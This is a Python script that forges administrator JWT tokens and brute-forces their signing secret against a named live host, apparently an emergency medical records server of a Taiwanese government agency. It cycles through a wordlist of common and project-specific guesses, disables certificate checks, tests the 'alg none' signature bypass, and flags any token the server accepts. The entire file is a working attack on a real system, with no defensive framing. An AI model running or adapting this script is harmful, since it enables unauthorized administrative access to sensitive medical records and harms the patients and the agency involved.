import requests, urllib3, ssl, hmac, hashlib, base64, json, time
urllib3.disable_warnings()
S = requests.Session(); S.verify=False

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def make_token(payload, secret, alg="HS256"):
    header = {"alg":alg,"typ":"JWT"}
    h = b64url(json.dumps(header,separators=(',',':')).encode())
    p = b64url(json.dumps(payload,separators=(',',':')).encode())
    if alg=="none":
        return f"{h}.{p}."
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

now = int(time.time())
payload = {
  "user":{"account":"admin","role":"ADMIN","name":"admin","id":1,"disabled":False},
  "permissions":["EPCR_SERVICE","AUTH_ROLE","AUTH_USER","AUTH_USER_ALL","AUTH_PERM",
    "AUTH_RESET_PASSWORD","AUTH_RESET_LOGIN","AUTH_DEL_USER","AUTH_2FA"],
  "iat": now-10, "exp": now+86400
}

secrets = []
def add(*x): secrets.extend(x)
# general
add("secret","password","password123","admin","admin123","root","letmein","changeme","topsecret",
    "supersecret","supersecret123","mysecret","mySecret","jwt","jwt_secret","jwtsecret",
    "jwt_secret_key","jwtsecretkey","signing_key","signingkey","secretkey","secret_key",
    "token","token_secret","token_secret_key","apikey","api_key","appsecret","app_secret",
    "mySecretKey","SuperSecretKey","super_secret","my-secret","secret123","123456","123456789",
    "qwerty","abc123","0123456789","12345678","password1","p@ssw0rd","Secret","SecretKey")
# node/express
add("express","node","nodejs","expressjwt","jsonwebtoken","node_secret","express_secret",
    "secretkey123","mysupersecret","SuperSecret123","SECRET","secretKey")
# project
add("epcr","EPCR","EPCRServer","AuthServer","authServer","epcrServer","epcr_server","epcr_secret",
    "epcr-jwt","epcr_jwt","epcr_jwt_secret","epcr_secret_key","tpf","TPF","tpfgov","tpfgovtw",
    "epcrtpf","epcr2024","epcr2023","epcr2025","epcr2022","EPCR2024","EPCR2023","EPCR2025",
    "auth_secret","authServer_secret","epcr_server_secret","hospital","hospitalserver",
    "HospitalServer","EmergencyMedical","ems","EMS","mer","MER","MERServer","merBridge")
# combined variants
add("epcr!secret","Epcr#2024","epcr@2024","epcr-secret","EPCR_secret","AuthServer2024",
    "tpf-epcr","tpf.gov.tw","epcr.tpf.gov.tw","epcrtpf2024","epcr#secret","EPCR123","epcr123")
# empty
secrets.append("")

def oracle(token):
    try:
        r = S.get("https://epcr.tpf.gov.tw:4004/config", timeout=12,
                  headers={"Authorization":"Bearer "+token})
        return r.status_code, r.text[:80]
    except Exception as e:
        return "ERR", str(e)

baseline = oracle("eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7fQ.fakesig")
print("baseline (bad sig):", baseline)

found=[]
for sec in secrets:
    tok = make_token(payload, sec, "HS256")
    code, body = oracle(tok)
    marker = ""
    if code not in (401,403) and "No authorization token" not in body and "invalid" not in body.lower():
        marker = "  <<< POSSIBLE MATCH"
        found.append((sec,code,body))
    print(f"[{code}] secret={sec!r:32} :: {body!r}{marker}")

# also test alg none
tok_none = make_token(payload,"","none")
code,body = oracle(tok_none)
print(f"[none] => [{code}] :: {body!r}")

print("\n=== POSSIBLE MATCHES ===")
for f in found: print(f)
print("total tested:", len(secrets))
